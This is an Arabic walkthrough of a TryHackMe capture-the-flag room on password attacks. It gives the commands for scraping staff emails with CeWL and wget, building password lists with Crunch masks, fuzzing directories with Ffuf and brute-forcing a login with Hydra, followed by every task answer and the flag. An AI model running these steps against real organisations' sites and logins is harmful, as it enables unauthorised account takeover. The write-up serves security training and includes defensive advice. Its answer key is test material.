# غرفة: مقدمة في القوائم المعجمية (Introduction to Wordlists)

---

## 1. نظرة عامة على الغرفة وهندستها المعمارية (Room Overview & Architecture)

تُعد غرفة **Introduction to Wordlists** (`introductiontowordlists`) الغرفة التطبيقية الثالثة في **الوحدة الحادية عشرة: هجمات كلمات المرور (Module 11: Password Attacks)** على مسار Jr Penetration Tester في منصة TryHackMe.
تركز الغرفة على تحويل الاستطلاع المفتوح (OSINT) إلى ترسانة هجومية مخصصة وعالية الفعالية؛ حيث يتفوق القاموس المخصص والموجه المكون من 100 كلمة على القواميس العامة العملاقة (مثل rockyou.txt):
- **الاستطلاع وتجريف المصادر:** استخدام أداة CeWL لزحف وتجريف صفحات الويب، وسحب وثائق PDF عبر Wget، واستخراج عناوين البريد وأسماء الموظفين عبر Regex.
- **توليد صيغ الحسابات المؤسسية:** تحويل الأسماء الكاملة إلى صيغ أسماء المستخدمين الشائعة في الشركات (`first.last`, `flast`, `firstl`) بواسطة معالج النصوص Awk.
- **تطهير وتنقية النصوص (Sanitization Pipeline):** تطبيق خطوط أنابيب لينكس (`sort -u`, `tr`, `grep`) لحذف التكرارات وتوحيد حالة الأحرف وإزالة المحارف غير المرغوبة.
- **توليد كلمات المرور بالأقنعة (Crunch Masks):** صياغة قوالب تركيبية موجهة (`Helios20%%!`) تطابق سياسات كلمات المرور المعقدة للمؤسسة.
- **التنفيذ الهجومي الميداني:** اكتشاف المسار الإداري المخفي `helios/` باستخدام أداة Ffuf، واختراق بوابة تسجيل الدخول بواسطة Hydra لاستخراج الراية النهائية.

```
       +-------------------------------------------------------------+
       |             CUSTOM WORDLIST ENGINEERING LIFECYCLE           |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|   1. HARVESTING  |                                      |  2. PROCESSING   |
|   (CeWL & Wget)  |                                      |   (Awk & Sort)   |
+------------------+                                      +------------------+
| - Crawl HTML     |                                      | - Generate Users |
| - Extract PDFs   |                                      | - Sort -u Clean  |
| - Regex Emails   |                                      | - Crunch Masks   |
+------------------+                                      +------------------+
         |                                                         |
         +----------------------------+----------------------------+
                                      |
                                      v
                     +----------------------------------+
                     |    3. OPERATIONAL EXPLOITATION   |
                     |          (Ffuf & Hydra)          |
                     +----------------------------------+
                     | - Ffuf: Discovers /helios (200)  |
                     | - Hydra: Alex.johnson Credential |
                     | - Flag: THM{w0rdlists_win_rooms} |
                     +----------------------------------+
```

---

## 2. المتطلبات الأساسية وإعداد المعمل (Prerequisites & Lab Setup)

### 2.1 المتطلبات التقنية والمعرفية
- الإلمام بأدوات سطر أوامر لينكس لمعالجة النصوص (`cat`, `sort`, `tr`, `grep`, `awk`, `sed`).
- فهم آلية استكشاف مسارات الويب (Fuzzing) ورموز استجابات HTTP (`200 OK`, `301/302 Redirect`).
- المعرفة الأساسية بأداة Hydra ومطابقة شروط النجاح والفشل في استمارات الويب.

### 2.2 إعداد المعمل والنطاقات المحلية
إضافة النطاقات الافتراضية المستهدفة إلى ملف المضيفين في النظام:
```bash
echo 'MACHINE_IP tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
```

---

## 3. الأهداف التعليمية وتصنيف بلوم (Learning Objectives & Bloom's Taxonomy)

1. **التذكر والفهم (Remembering & Understanding):** استيعاب تصنيفات الكلمات المفتاحية الثلاث (الخاصة بالمؤسسة، التكنولوجية، والعامة)؛ وحفظ معاملات أدوات CeWL و Crunch و Sort.
2. **التطبيق والتحليل (Applying & Analyzing):** تطبيق أدوات التجريف الآلي (CeWL) واستخراج النصوص من الـ PDF؛ وتحليل صيغ أسماء المستخدمين وتوليدها عبر نصوص Awk.
3. **التقييم والاستنتاج (Evaluating & Synthesizing):** تقييم الفارق في الفعالية والسرعة بين القواميس العامة غير الموجهة والقواميس السياقية المركبة؛ واستنتاج نمط كلمات المرور المؤسسي.
4. **التصميم والدفاع (Creating & Defending):** تصميم خط أنابيب متكامل لتطهير وتوليد القوائم؛ واقتراح سياسات دفاعية تمنع اعتماد كلمات المرور على أسماء المشاريع والشعارات الشائعة.

---

## 4. العمق المفاهيمي والتقني: هندسة وتخصيص القوائم (Technical Concept Deep Dive)

### 4.1 تفكيك ثغرة القواميس العامة (The RockYou Fallacy)
تعتمد قائمة `rockyou.txt` على تسريبات قديمة لا تراعي سياسات التعقيد الحديثة للمؤسسات (مثل فرض 11 محرفاً تتضمن حرفاً كبيراً ورقماً ورمزاً خاصاً). عندما تطبق شركة نمطاً مثل `Helios20NN!`، فإن `rockyou.txt` ستفشل حتماً. في المقابل، يتيح الاستطلاع الذكي لمختبر الاختراق اكتشاف الكود البرمجي للمشروع الداخلي (`Helios`) وسنة النشر، مما يحصر فضاء البحث في 100 احتمال فقط عبر أداة Crunch.

### 4.2 خط أنابيب التطهير والتوحيد (Sanitization Pipeline)
تتسبب المحارف غير المتجانسة ومحارف نهاية السطر الويندوزية (`\r`) في فشل مطابقة الكلمات برمجياً. استخدام الأمر:
```bash
tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u
```
يضمن توحيد حالة الحروف، وإزالة محارف السطور التالفة، وفلترة الكلمات القصيرة جداً، وإلغاء التكرار تماماً (`sort -u`).

---

## 5. سطح الهجوم ونمذجة التهديدات لمؤسسة TryFinanceMe (Attack Surface & Threat Modeling)

```
[Attacker]
   |
   +---> (1) Crawl http://tryfinanceme.local/       ---> Scrapes 4 CeWL Emails & Words
   |
   +---> (2) Wget http://tryfinanceme.local/docs/   ---> Downloads 1 PDF, Scrapes 4 Emails
   |
   +---> (3) Scrape http://social.tryfinanceme.local---> Generates Users via Awk (Alex Johnson)
   |
   +---> (4) Crunch Mask Helios20%%!               ---> Generates 100 Passwords (Helios2000!-2099!)
   |
   +---> (5) Ffuf Directory Fuzzing                ---> Uncovers /helios (Status 200)
   |
   +---> (6) Hydra HTTP POST Spray                 ---> Breaches alex.johnson / Helios20NN!
```

---

## 6. منهجية الاستغلال والحل العملي المفصل خطوة بخطوة (Exploitation Methodology)

### الخطوة 1: تجريف الويب واستخراج المستندات (Task 03)
1. تشغيل أداة CeWL للزحف واستخراج العناوين والكلمات:
   ```bash
   cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
   ```
   **النتيجة:** تم استخراج **4** عناوين بريد فريدة.
2. سحب وثائق الـ PDF المنشورة:
   ```bash
   wget -r -A pdf http://tryfinanceme.local/docs/
   ```
   **النتيجة:** تم العثور على ملف PDF **واحد (1)**.
3. استخراج العناوين البريدية من ملف الـ PDF:
   ```bash
   grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs | sort -u > emails_docs.unique.txt
   ```
   **النتيجة:** استخراج **4** عناوين بريد.
4. عزل أسماء المستخدمين وفحص السطر الأخير:
   ```bash
   grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
   tail -n 1 users_from_emails.txt
   ```
   **النتيجة:** اسم المستخدم الأخير هو: `security`.

### الخطوة 2: تطهير القواميس وتوليد كلمات المرور بالأقنعة (Task 04)
1. دمج وتطهير قائمة الكلمات واستبعاد التكرارات:
   ```bash
   cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
   wc -l words_clean.txt
   ```
   **النتيجة:** يحتوي الملف المطهر على **161** كلمة.
2. توليد قائمة كلمات المرور المركبة عبر Crunch بنمط `Helios20%%!`:
   ```bash
   crunch 11 11 -t Helios20%%! -o pass_helios.txt
   ```
3. استخراج كلمة المرور العاشرة (10th password):
   ```bash
   sed -n '10p' pass_helios.txt
   ```
   **النتيجة:** `Helios2009!`.
4. المعامل المستخدم في sort لإزالة التكرار: `-u`، ومحرف تمثيل الأرقام في crunch هو: `%`.

### الخطوة 3: استكشاف المسارات واختراق البوابة (Task 05)
1. فحص المسارات باستخدام Ffuf والقائمة المطهرة:
   ```bash
   ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
   ```
   **النتيجة:** اكتشاف مسار `helios/` برمز الحالة **200**.
2. شن هجوم التخمين بواسطة Hydra ضد نموذج تسجيل الدخول الداخلي:
   ```bash
   hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
   ```
   **النتيجة:** اكتشاف حساب الموظف: `alex.johnson`.
3. تسجيل الدخول بالبيانات المكتشفة في `http://tryfinanceme.local/helios/`:
   **الراية المستخرجة:** `THM{w0rdlists_win_rooms}`.

---

## 7. التحليل الجنائي وتطهير النصوص (Forensic Analysis & Text Processing Telemetry)

- **أثر الاستعلام المعجمي في سجلات الويب:**
  يُظهر فحص سجلات الخادم أن استخدام قائمة مطهرة من 161 كلمة ولد 161 طلباً فقط لاكتشاف المسار الحساس، مقارنة بآلاف الطلبات التي يولدها قاموس عام، مما قلل البصمة الجنائية بنسبة تتجاوز **98%** وتفادى إثارة إنذارات أنظمة كشف التسلل (IDS).

---

## 8. الهندسة الدفاعية وسياسات كلمات المرور المقاومة للقواميس (Defensive Engineering & Remediation)

### 8.1 حظر كلمات المرور السياقية والموسمية
- تفعيل قوائم الحظر الديناميكية في Active Directory (عبر Azure AD Password Protection أو تقنيات مماثلة) لمنع الموظفين من تعيين كلمات مرور تحتوي على اسم الشركة، أو أسماء المشاريع الداخلية، أو أسماء الفصول والأعوام.

### 8.2 تعتيم المستندات والبيانات الوصفية
- تنظيف المستندات وملفات الـ PDF المنشورة علناً من بيانات التعريف الوصفية (Metadata) واستبعاد العناوين البريدية الداخلية للموظفين.

---

## 9. مرجع الأوامر والأدوات (Tools & Command Reference)

| الأداة | الأمر النموذجي | الغرض العملياتي |
| :--- | :--- | :--- |
| **CeWL** | `cewl -d 2 -m 3 --lowercase -e --email_file emails.txt -w words.txt URL` | زحف وتجريف الكلمات والعناوين البريدية من الموقع |
| **Crunch** | `crunch 11 11 -t Helios20%%! -o pass.txt` | توليد قائمة كلمات مرور تركيبية وفق قناع محدد |
| **Sort** | `sort -u input.txt > output.txt` | فرز الملف وإزالة الأسطر المكررة |
| **Ffuf** | `ffuf -w words.txt -u http://target/FUZZ -mc 200,301` | استكشاف المسارات والملفات المخفية بسرعة فائقة |
| **Awk** | `awk '{print tolower($1)"."tolower($2)}' names.txt` | تحويل الأسماء إلى صيغة `first.last` للمستخدمين |

---

## 10. الخلاصة المعرفية والخريطة الذهنية (Key Takeaways & Mind Map)

```
                 +-----------------------------------------+
                 |       WORDLIST ENGINEERING LIFECYCLE    |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
[Reconnaissance & Scraping]  [Sanitization & Permutations] [Operational Exploitation]
- CeWL: Words & Emails       - tr: Lowercase & Strip \r    - Ffuf: Discovers /helios (200)
- Wget: Harvest PDFs         - sort -u: Deduplication      - Hydra: Breaches alex.johnson
- Strings/Regex: Users       - Crunch: Helios20%%! Mask    - Flag: THM{w0rdlists_win_rooms}
```

---

## 11. مصفوفة المخاطر والثغرات (Vulnerability & Risk Matrix)

| المتجه الهجومي | التصنيف المعياري | شدة الخطورة | الأثر التشغيلي والتقني |
| :--- | :---: | :---: | :--- |
| Information Disclosure via Public PDFs | **CWE-200** | **متوسطة (MEDIUM)** | تسريب البنية البريدية وأسماء المستخدمين الداخليين. |
| Predictable Corporate Password Scheme | **CWE-521** | **عالية (HIGH)** | تمكين المهاجم من حصر كلمات المرور في 100 احتمال واختراق الحساب. |
| Unprotected Internal Admin Portal | **CWE-284** | **حرجة (CRITICAL)** | كشف لوحة إدارة داخلية حساسة بدون عزل شبكي أو قيود IP. |

---

## 12. التحقق وإثبات الإنجاز (Verification & Proof of Work)

تم إكمال كافة مهام الغرفة الست والأسئلة الاثني عشر بنسبة 100% ومطابقتها مع الحساب المعتمد على المنصة:
- **المهمة 01:** `No answer needed`
- **المهمة 02:** `crunch`
- **المهمة 03:** `4`، `1`، `4`، `security`
- **المهمة 04:** `161`، `Helios2009!`، `-u`، `%`
- **المهمة 05:** `200`، `alex.johnson`، `THM{w0rdlists_win_rooms}`
- **المهمة 06:** `No answer needed`

---

## 13. الأسئلة الشائعة والأخطاء المحتملة (Frequently Asked Questions)

### س1: ما هو دور محرف `%` في قوالب أداة Crunch؟
- يمثل محرف `%` في قوالب Crunch خانة رقمية واحدة تتغير من 0 إلى 9. عند كتابة `%%` يتم توليد خانتين رقميتين تمثلان 100 احتمال (من 00 إلى 99).

### س2: لماذا نستخدم `tr -d '\r'` أثناء تنقية القوائم في بيئة لينكس؟
- لأن الملفات المنشأة على أنظمة ويندوز تستخدم محرفي العودة لبداية السطر والتغذية (`\r\n`). في أنظمة لينكس، يعتبر محرف `\r` جزءاً من الكلمة نفسها، مما يؤدي لفشل التخمين ومطابقة الكلمات في أدوات مثل Hydra و Ffuf ما لم يتم حذفه.

---

## 14. المراجع وروابط التوثيق الرسمية (References & External Links)

- [CeWL Official GitHub Repository](https://github.com/digininja/CeWL)
- [Crunch SourceForge Project](https://sourceforge.net/projects/crunch-wordlist/)
- [Ffuf Fast Web Fuzzer](https://github.com/ffuf/ffuf)
- [SecLists Security Lists Repository](https://github.com/danielmiessler/SecLists)
- [TryHackMe Room: Introduction to Wordlists](https://tryhackme.com/room/introductiontowordlists)
